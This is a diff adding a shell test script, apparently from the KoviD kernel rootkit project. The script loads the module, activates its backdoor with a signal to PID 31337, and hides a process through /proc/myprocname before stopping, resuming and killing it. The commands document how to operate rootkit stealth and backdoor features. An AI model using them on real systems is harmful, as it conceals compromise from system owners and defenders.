@@ -1,0 +1,72 @@
+# REQUIRES: DEBUG_ONLY
+# REQUIRES: NATIVE_TESTS
+#
+# This test verifies the hidden process control commands:
+#   - signal-task-stop: pause (stop) a hidden process
+#   - signal-task-cont: resume (continue) a hidden process
+#   - signal-task-kill: terminate (kill) a hidden process
+#
+# The test starts a busy-loop process in the background, hides it,
+# and then uses the above commands to control its execution.
+#
+# RUN: bash %s > %t.log
+# RUN: FileCheck-18 --input-file=%t.log %s
+
+# Clear kernel messages.
+sudo dmesg -c
+sleep 10
+
+# Insert the kernel module and ensure the backdoor is active.
+sudo insmod ../../../build/kovid.ko
+kill -CONT 31337
+
+###############################################################################
+# Start a busy-loop process.
+###############################################################################
+# A simple busy loop that never terminates.
+../../../test/native/Inputs/a.testexe &
+BUSY_PID=$!
+echo "Busy loop process PID is $BUSY_PID"
+# CHECK: Busy loop process PID is
+# CHECK: Process killed
+
+###############################################################################
+# Hide the process.
+###############################################################################
+# Hiding a process is done by simply writing its PID to /proc/myprocname.
+echo $BUSY_PID > /proc/myprocname
+sleep 1
+
+###############################################################################
+# Test: signal-task-stop (pause the process)
+###############################################################################
+echo "Sending signal-task-stop to $BUSY_PID"
+echo signal-task-stop=$BUSY_PID > /proc/myprocname
+sleep 2
+
+###############################################################################
+# Test: signal-task-cont (resume the process)
+###############################################################################
+echo "Sending signal-task-cont to $BUSY_PID"
+echo signal-task-cont=$BUSY_PID > /proc/myprocname
+sleep 2
+
+###############################################################################
+# Test: signal-task-kill (terminate the process)
+###############################################################################
+echo "Sending signal-task-kill to $BUSY_PID"
+echo signal-task-kill=$BUSY_PID > /proc/myprocname
+sleep 2
+
+# Verify that the process is no longer running by checking /proc/<pid> existence.
+if [ -e /proc/$BUSY_PID ]; then
+    echo "ERROR: Process not killed"
+else
+    echo "Process killed"
+fi
+
+###############################################################################
+# Cleanup: Remove the kernel module.
+###############################################################################
+sudo rmmod kovid
+sudo dmesg
